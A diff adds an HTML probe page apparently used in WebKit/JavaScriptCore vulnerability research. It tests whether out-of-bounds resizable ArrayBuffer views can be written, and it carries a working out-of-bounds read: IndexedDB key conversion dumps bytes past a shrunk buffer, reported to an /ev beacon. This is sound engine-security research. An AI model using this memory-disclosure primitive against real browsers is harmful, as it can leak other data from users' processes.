@@ -1,0 +1,232 @@
+<!doctype html>
+<html><head><meta charset="utf-8"><title>caps16 — the write direction: every in-engine write spelling against an OOB resizable view</title></head>
+<body>
+<script>
+/*
+  docs/97 probe. The companion of caps15.html (docs/96, the READ direction).
+
+  Claim under test: `JSC::ArrayBufferView::byteLength()` tests the sub-range inverted (docs/95 §6, docs/96),
+  and the only ungated producer of a native view that can carry a resizable buffer is
+  `IDBKey::createBinary` (a read). Every engine *write* consumer is therefore gated by the IDL converter --
+  `JSArrayBufferView::toWrapped` / `toWrappedAllowShared` / `JSGenericTypedArrayView::toWrapped*` all refuse
+  `isResizableOrGrowableShared()` -- and the JS-level write spellings go through `validateTypedArray` /
+  `inBounds` / `viewByteLength`, which use the *correct* `integerIndexedObject*` length.
+
+  Arm `w` takes ONE out-of-bounds view (8192-byte view over a resizable 8192 buffer shrunk to 4112), proves
+  in the same process that it is OOB and readable through the ungated path (K), then aims every write
+  spelling the engine has at it. The witness is a second key read (RB) of the SAME physical bytes: if any
+  arm had written to 4128, RB would differ from K. RBw proves the witness is sensitive (a legitimate page
+  write through grow+shrink shows up as 0x99). The grow-back readback is NOT usable and arm `grow` says why:
+  `ArrayBuffer::resize()` memsets the newly-visible range on grow (ArrayBuffer.cpp:540).
+
+  Arm `ctl` is the positive control: the same API calls on a NON-resizable view must all write.
+
+  Arms: w (battery) | ctl | grow | fl
+  ONLY= filters the battery's beacon groups (same object, same process).
+*/
+(function () {
+  'use strict';
+  var Q = new URLSearchParams(location.search);
+  var ARM = Q.get('arm') || 'w';
+  var ONLY = (Q.get('only') || '').split(',').filter(Boolean);
+  function on(n) { return !ONLY.length || ONLY.indexOf(n) >= 0; }
+  function B(m) { (new Image()).src = '/ev?m=' + encodeURIComponent(m); }
+  function clean(s) { return String(s).replace(/[^\x20-\x7e]/g, '?').slice(0, 64); }
+  function arm(name, fn) {
+    if (!on(name)) return;
+    try { fn(); } catch (e) { B(name + ' THREW=' + e.name + ':' + clean(e.message)); }
+  }
+  function hex(u8, off, n) {
+    var s = '';
+    for (var i = off; i < off + n && i < u8.length; i++) s += ('0' + u8[i].toString(16)).slice(-2);
+    return s;
+  }
+  function pat(ab, seed) {
+    var u = new Uint8Array(ab);
+    for (var i = 0; i < u.length; i++) u[i] = (i ^ seed) & 0xff;
+    return u;
+  }
+  function keyOf(v, tag) {
+    try {
+      var k = IDBKeyRange.only(v).lower;
+      var bl = (k && typeof k.byteLength === 'number') ? k.byteLength : -1;
+      B(tag + ' ok type=' + (k && k.constructor ? k.constructor.name : typeof k) + ' bl=' + bl);
+      if (bl > 0) {
+        var u = new Uint8Array(k);
+        B(tag + ' head=' + hex(u, 0, 8) + ' at4128=' + hex(u, 4128, 8) + ' tail=' + hex(u, u.length - 8, 8));
+      }
+    } catch (e) { B(tag + ' err=' + e.name + ':' + clean(e.message)); }
+  }
+
+  var probe = document.createElement('canvas').getContext('webgl');
+  B('caps16 arm=' + ARM + ' only=' + (ONLY.join(',') || '-')
+    + ' resize=' + (typeof ArrayBuffer.prototype.resize)
+    + ' grv=' + (typeof (window.crypto && crypto.getRandomValues))
+    + ' te=' + (typeof TextEncoder)
+    + ' idbkr=' + (typeof IDBKeyRange)
+    + ' sab=' + (typeof SharedArrayBuffer)
+    + ' gpu=' + (typeof navigator.gpu)
+    + ' vf=' + (typeof VideoFrame)
+    + ' glctx=' + (probe === null ? 'null' : 'obj')
+    + ' glc=' + (typeof WebGLRenderingContext));
+
+  if (ARM === 'fl') arm('FL', function () {
+    function ctxOf(t) {
+      var c = document.createElement('canvas');
+      try { return c.getContext(t) === null ? 'null' : 'obj'; } catch (e) { return 'threw'; }
+    }
+    B('FL webgl=' + ctxOf('webgl') + ' webgl2=' + ctxOf('webgl2')
+      + ' videoframe=' + (typeof VideoFrame)
+      + ' encodedchunk=' + (typeof EncodedVideoChunk)
+      + ' videoencoder=' + (typeof VideoEncoder)
+      + ' fshandle=' + (typeof FileSystemFileHandle)
+      + ' opfs=' + (typeof (navigator.storage && navigator.storage.getDirectory))
+      + ' gpuqueue=' + (typeof (window.GPUQueue)));
+  });
+
+  if (ARM === 'grow') arm('G', function () {
+    // Why the readback witness is a key read and not a grow-back: resize() zeroes on grow.
+    var ab = new ArrayBuffer(8192, { maxByteLength: 8192 });
+    pat(ab, 0x5a);
+    var v = new Uint8Array(ab, 0, 8192);
+    ab.resize(4112);
+    var k1 = new Uint8Array(IDBKeyRange.only(v).lower);
+    B('G pre bufBL=' + ab.byteLength + ' key4128=' + k1[4128] + ' key5000=' + k1[5000]);
+    ab.resize(8192);
+    var u = new Uint8Array(ab);
+    B('G grown at4112=' + u[4112] + ' at4128=' + u[4128] + ' at8191=' + u[8191]);
+    u[4128] = 0x99;
+    ab.resize(4112);
+    var k2 = new Uint8Array(IDBKeyRange.only(v).lower);
+    B('G shrink2 key4128=' + k2[4128] + ' key5000=' + k2[5000]);
+  });
+
+  if (ARM === 'ctl') arm('C', function () {
+    // Positive control: every spelling the `w` arm aims at the OOB view, aimed at a NON-resizable one.
+    var ctl = new ArrayBuffer(8192);
+    pat(ctl, 0x11);
+    var v = new Uint8Array(ctl, 0, 8192);
+    B('C pre jsBL=' + v.byteLength + ' len=' + v.length + ' bufBL=' + ctl.byteLength);
+    v.set(new Uint8Array(4096).fill(0x41), 4096);
+    B('C set at4128=' + v[4128]);
+    v.fill(0x42, 0, 16);
+    B('C fill at0=' + v[0]);
+    v.copyWithin(0, 4096);
+    B('C copyWithin at0=' + v[0] + ' at16=' + v[16]);
+    v[5000] = 0x44;
+    B('C index at5000=' + v[5000]);
+    var dv = new DataView(ctl);
+    dv.setUint8(4128, 0x45);
+    B('C dv at4128=' + v[4128] + ' dvGet=' + dv.getUint8(4128));
+    var r = new TextEncoder().encodeInto('A'.repeat(8), v);
+    B('C encodeInto read=' + r.read + ' written=' + r.written + ' at0=' + v[0]);
+    v.fill(0, 0, 8192);
+    crypto.getRandomValues(v);
+    var nz = 0;
+    for (var i = 0; i < v.length; i++) if (v[i] !== 0) nz++;
+    B('C grv nz=' + nz + ' of ' + v.length);
+  });
+
+  if (ARM === 'ok') arm('O', function () {
+    // Which layer refuses what: the JSC-level gate follows the LIVE bounds, the IDL converter refuses
+    // resizability whether the view is in bounds or not.
+    var ab = new ArrayBuffer(8192, { maxByteLength: 8192 });
+    var u = new Uint8Array(ab, 0, 8192);
+    var dv = new DataView(ab, 0, 8192);
+    u[4128] = 0x47;
+    B('O index in-bounds at4128=' + u[4128]);
+    dv.setUint8(5000, 0x48);
+    B('O dv in-bounds at5000=' + u[5000] + ' dvBL=' + dv.byteLength);
+    try { var r = new TextEncoder().encodeInto('AB', u); B('O encodeInto in-bounds read=' + r.read + ' written=' + r.written + ' at0=' + u[0]); }
+    catch (e) { B('O encodeInto in-bounds ' + e.name + ':' + clean(e.message)); }
+    try { crypto.getRandomValues(u); B('O grv in-bounds ok=WROTE'); }
+    catch (e) { B('O grv in-bounds ' + e.name + ':' + clean(e.message)); }
+    ab.resize(16);
+    B('O shrunk jsBL=' + u.byteLength + ' len=' + u.length + ' dvBL=' + (function () { try { return dv.byteLength; } catch (e) { return e.name; } })());
+    u[4128] = 0x49;
+    B('O post-shrink index read=' + u[4128]);
+    try { dv.setUint8(5000, 0x4a); B('O post-shrink dv ok=WROTE'); }
+    catch (e) { B('O post-shrink dv ' + e.name + ':' + clean(e.message)); }
+    try { new TextEncoder().encodeInto('AB', u); B('O post-shrink encodeInto ok=WROTE'); }
+    catch (e) { B('O post-shrink encodeInto ' + e.name + ':' + clean(e.message)); }
+  });
+
+  if (ARM === 'w') {
+    // one object: resizable 8192, position-dependent fill, shrunk so the 8192 view is OOB
+    var ab = new ArrayBuffer(8192, { maxByteLength: 8192 });
+    pat(ab, 0x5a);
+    var v = new Uint8Array(ab, 0, 8192);
+    var dv = null;
+    try { dv = new DataView(ab, 0, 8192); } catch (e) { B('W dvctor=' + e.name); }
+    var ctl = new ArrayBuffer(8192);                 // non-resizable: source buffer + GR positive control
+    var vn = new Uint8Array(ctl, 0, 8192);
+    ab.resize(4112);
+    B('W pre jsBL=' + v.byteLength + ' jsLen=' + v.length + ' off=' + v.byteOffset
+      + ' bufBL=' + ab.byteLength + ' dv=' + (dv ? 'ok' : 'null')
+      + ' expect4128=' + ((4128 ^ 0x5a) & 0xff) + ' expect5000=' + ((5000 ^ 0x5a) & 0xff));
+
+    // K: the ungated read path, in this process, on this object -- proves the view is OOB and reachable
+    if (on('K')) arm('K', function () { keyOf(v, 'K'); });
+
+    // 1. crypto.getRandomValues(view) -- the one native ArrayBufferView& write consumer in this build
+    if (on('GR')) arm('GR', function () { crypto.getRandomValues(v); B('GR ok=WROTE'); });
+    // 2. its positive control: the same call on a non-resizable view must write
+    if (on('GRn')) arm('GRn', function () {
+      crypto.getRandomValues(vn);
+      var nz = 0;
+      for (var i = 0; i < vn.length; i++) if (vn[i] !== 0) nz++;
+      B('GRn ok nz=' + nz + ' of ' + vn.length);
+    });
+    // 3. an IN-BOUNDS resizable view: if this is refused too, the gate is resizability, not bounds
+    if (on('GRi')) arm('GRi', function () {
+      var ab2 = new ArrayBuffer(8192, { maxByteLength: 8192 });
+      var v2 = new Uint8Array(ab2, 0, 8192);
+      B('GRi pre jsBL=' + v2.byteLength + ' bufBL=' + ab2.byteLength);
+      crypto.getRandomValues(v2);
+      B('GRi ok=WROTE');
+    });
+
+    // 4-8. the JS-level write spellings
+    if (on('SE')) arm('SE', function () { v.set(vn, 0); B('SE ok=WROTE'); });
+    if (on('FI')) arm('FI', function () { v.fill(0x42, 0, 8192); B('FI ok=WROTE'); });
+    if (on('CW')) arm('CW', function () { v.copyWithin(0, 4096, 8192); B('CW ok=WROTE'); });
+    if (on('SO')) arm('SO', function () { v.sort(); B('SO ok=WROTE'); });
+    if (on('IX')) arm('IX', function () {
+      v[4128] = 0x43;
+      v[5000] = 0x44;
+      B('IX silent read4128=' + v[4128] + ' read5000=' + v[5000] + ' len=' + v.length);
+    });
+    // 9. the DataView spelling (created in bounds before the shrink)
+    if (on('DV')) arm('DV', function () { dv.setUint8(4128, 0x45); B('DV ok=WROTE'); });
+    if (on('DVg')) arm('DVg', function () { B('DVg read=' + dv.getUint8(4128)); });
+    if (on('DVb')) arm('DVb', function () { B('DVb bl=' + dv.byteLength); });
+    // 10. TextEncoder.encodeInto -- the typed-view spelling of the same byteLength()-bounded write
+    if (on('TEn')) arm('TEn', function () {
+      var r = new TextEncoder().encodeInto('A'.repeat(64), v);
+      B('TEn ok read=' + r.read + ' written=' + r.written);
+    });
+    // 11. XHR.send(ArrayBufferView) -- a native-view consumer, read-only in source
+    if (on('XH')) arm('XH', function () {
+      var x = new XMLHttpRequest();
+      x.open('POST', '/sink', false);
+      x.send(v);
+      B('XH ok=POSTED status=' + x.status);
+    });
+
+    // RB: the witness -- the same physical bytes through the ungated key path, after every arm above
+    if (on('RB')) arm('RB', function () { keyOf(v, 'RB'); });
+    // RBw: the witness's sensitivity control -- a legitimate page write to 4128 must show up as 0x99
+    if (on('RBw')) arm('RBw', function () {
+      ab.resize(8192);
+      var u = new Uint8Array(ab);
+      u[4128] = 0x99;
+      u[5000] = 0x98;
+      ab.resize(4112);
+      keyOf(v, 'RBw');
+    });
+  }
+
+  B('done arm=' + ARM);
+})();
+</script>
+</body></html>
